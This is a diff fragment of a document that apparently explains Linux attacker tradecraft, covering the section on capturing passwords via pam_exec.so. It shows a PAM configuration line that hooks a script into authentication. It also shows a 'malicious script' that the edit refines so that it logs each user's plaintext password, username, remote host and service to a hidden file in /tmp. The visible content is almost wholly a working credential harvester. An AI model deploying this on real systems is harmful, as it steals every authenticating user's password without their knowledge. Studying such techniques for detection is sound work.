@@ -176,7 +176,7 @@ Why attackers use this:
 
 ---
 
-### 3. Password Capture via `pam_exec.so` (Real Tradecraft)
+### 3. Password Capture via `pam_exec.so` 
 
 Target file:
 
@@ -190,12 +190,16 @@ Example:
 auth optional pam_exec.so expose_authtok /tmp/cred.sh
 ```
 
-Malicious script:
+Malicious script (shorthand):
 
 ```bash
 #!/bin/bash
-read password
-echo "$(date) $PAM_USER:$password" >> /tmp/.creds
+
+# Read password from stdin (provided by PAM when expose_authtok is used)
+
+if read -r password; then
+    echo "$(date) user=$PAM_USER pass=$password rhost=$PAM_RHOST service=$PAM_SERVICE" >> /tmp/.creds
+fi
 ```
 
 Execution flow:
